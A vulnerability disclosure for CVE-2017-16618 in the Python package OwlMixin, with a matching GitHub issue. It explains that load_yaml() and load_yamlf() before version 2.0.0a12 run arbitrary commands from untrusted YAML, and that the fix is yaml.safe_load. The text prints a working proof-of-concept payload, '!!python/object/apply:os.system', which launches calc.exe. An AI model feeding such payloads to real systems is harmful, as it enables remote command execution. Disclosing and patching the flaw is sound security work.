# CVE-2017-16618: Convert Through OwlMixin

**Python Package:**　　[OwlMixin](https://pypi.python.org/pypi/owlmixin/)

 **Version:**　　　　　 Before 2.0.0a12

 **Published:**　　　　Nov. 7th. 2017

 **Reported by:** 　　　　　 Joel

 **CVE-2017-16618** 　　　[CVE\_details](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16618)

## Overview

`OwlMixin` is a Library which converts data class instance and others each other.Recently,an issue was discovered in the `owlmixin` package before `2.0.0a12`.Untrusted data passed into the `load_yaml()` and the `load_yamlf()` functions can execute arbitrary python commands resulting in command execution.

## POC

| ``` 1 2 3 4  ``` | ``` from owlmixin import util util.load_yaml('!!python/object/apply:os.system ["calc.exe"]') util.load_yamlf('joel.yml','utf-8') #'joel.yml'：!!python/object/apply:os.system ["calc.exe"]  ``` |
| --- | --- |

##### Poc Video

## Remediation

The updated versions of `OwlMixin (2.0.0a12)` correctly use the `yaml.safe_load` method which prevents remote code execution.

[![@Joel-MalwareBenchmark](https://avatars.githubusercontent.com/u/33394474?u=7a71ae15d2a1bc127530ef0efdb9b10ef45088f4&v=4&size=48)](/Joel-MalwareBenchmark)[Joel-MalwareBenchmark](https://github.com/Joel-MalwareBenchmark)opened [on Nov 7, 2017](https://github.com/tadashi-aikawa/owlmixin/issues/12#issue-271746429)

from owlmixin import util

util.load\_yaml('!!python/object/apply:os.system ["calc.exe"]')

util.load\_yamlf('joel.yml','utf-8')

#'joel.yml'：!!python/object/apply:os.system ["calc.exe"]

Hi, there is a vulnerability in load\_yaml and load\_yamlf methods in util.py, please see PoC above. It can execute arbitrary python commands resulting in command execution.
